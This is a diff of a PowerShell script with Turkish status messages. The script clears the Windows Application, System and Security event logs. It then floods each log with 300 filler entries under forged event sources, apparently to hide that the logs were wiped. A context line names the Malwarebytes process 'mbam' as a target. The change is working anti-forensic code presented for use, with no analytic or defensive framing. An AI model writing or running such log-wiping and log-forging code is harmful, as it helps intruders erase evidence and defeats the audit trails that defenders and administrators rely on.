@@ -156,23 +156,25 @@ $targetProcessName = "mbam"
 # -------------------------------
 $logs = @("Application", "System", "Security")
 
-if (-not [System.Diagnostics.EventLog]::SourceExists("FakeSource")) {
-    [System.Diagnostics.EventLog]::CreateEventSource("FakeSource", "Application")
+foreach ($log in $logs) {
+    $sourceName = "FakeSource_$log"
+    if (-not [System.Diagnostics.EventLog]::SourceExists($sourceName)) {
+        [System.Diagnostics.EventLog]::CreateEventSource($sourceName, $log)
+    }
 }
 
 foreach ($log in $logs) {
+    $sourceName = "FakeSource_$log"
     try {
         Clear-EventLog -LogName $log
         Write-Output "$log temizlendi."
     } catch {
         Write-Output "$log temizlenemedi: $_"
     }
-}
 
-foreach ($log in $logs) {
     for ($i=0; $i -lt 300; $i++) {
         try {
-            Write-EventLog -LogName $log -Source "FakeSource" -EntryType Information -EventId 1000 -Message "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+            Write-EventLog -LogName $log -Source $sourceName -EntryType Information -EventId 1000 -Message "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
         } catch {
             Write-Output "$log üzerine yazma başarısız: $_"
         }
